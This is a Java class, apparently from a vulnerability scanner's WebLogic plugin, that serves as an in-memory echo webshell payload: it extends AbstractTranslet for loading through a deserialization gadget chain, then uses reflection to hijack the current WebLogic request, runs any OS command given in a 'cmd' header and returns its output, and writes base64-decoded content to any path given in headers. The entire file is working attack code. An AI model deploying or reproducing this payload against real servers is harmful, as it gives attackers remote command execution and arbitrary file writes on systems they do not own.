package com.gbw.scanner.plugins.scripts.weblogic.shell;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import sun.misc.BASE64Decoder;
import weblogic.servlet.internal.HttpConnectionHandler;
import weblogic.servlet.internal.ServletOutputStreamImpl;
import weblogic.servlet.internal.ServletRequestImpl;
import weblogic.servlet.internal.ServletResponseImpl;
import weblogic.servlet.provider.ContainerSupportProviderImpl;
import weblogic.work.ExecuteThread;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.lang.reflect.Field;

public class GBWHttpEchoShell12 extends AbstractTranslet {
    static {
        try{
            ExecuteThread thread= (ExecuteThread) Thread.currentThread();
            ContainerSupportProviderImpl.WlsRequestExecutor executor = (ContainerSupportProviderImpl.WlsRequestExecutor) thread.getCurrentWork();
            Field field = ContainerSupportProviderImpl.WlsRequestExecutor.class.getDeclaredField("connectionHandler");
            field.setAccessible(true);
            HttpConnectionHandler httpConn = (HttpConnectionHandler) field.get(executor);
            ServletRequestImpl req=httpConn.getServletRequest();
            ServletResponseImpl res=req.getResponse();
            ServletOutputStreamImpl out= res.getServletOutputStream();
            String type=req.getRequestHeaders().getHeader("type","");
            if(type==null||type.equals("exec")){//执行命令
                String cmd=req.getRequestHeaders().getHeader("cmd","");
                if(cmd==null){
                    cmd="whoami";
                }
                res.setHeader("isVul","ok");
                String result=exec(cmd);
                out.print(result);
                out.flush();
                res.getWriter().write("");
            }else if(type.equals("upload")){//上传文件
                String path=req.getRequestHeaders().getHeader("path","");
                String text=req.getRequestHeaders().getHeader("text","");
                upload(path,text);
            }
        }catch (Exception e){
        }

    }
    //上传文件
    public static void upload(String path, String text){
        try {
            FileOutputStream fileOutputStream = new FileOutputStream(path);
            fileOutputStream.write(new BASE64Decoder().decodeBuffer(text));
            fileOutputStream.flush();
            fileOutputStream.close();
        }catch (Exception e) {

        }
    }
    //执行命令
    public static String exec(String cmd){
        try{
            String name=System.getProperty("os.name");
            String[] cmds =name!=null&&name.toLowerCase().contains("win") ? new String[]{"cmd.exe", "/c",  cmd}:new String[]{"sh", "-c", cmd};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            byte[] buf=new byte[1024];
            int len=0;
            ByteArrayOutputStream out=new ByteArrayOutputStream();
            while ((len=in.read(buf))!=-1){
                out.write(buf,0,len);
            }
            return new String(out.toByteArray());
        }catch (Exception e){

        }
        return null;
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
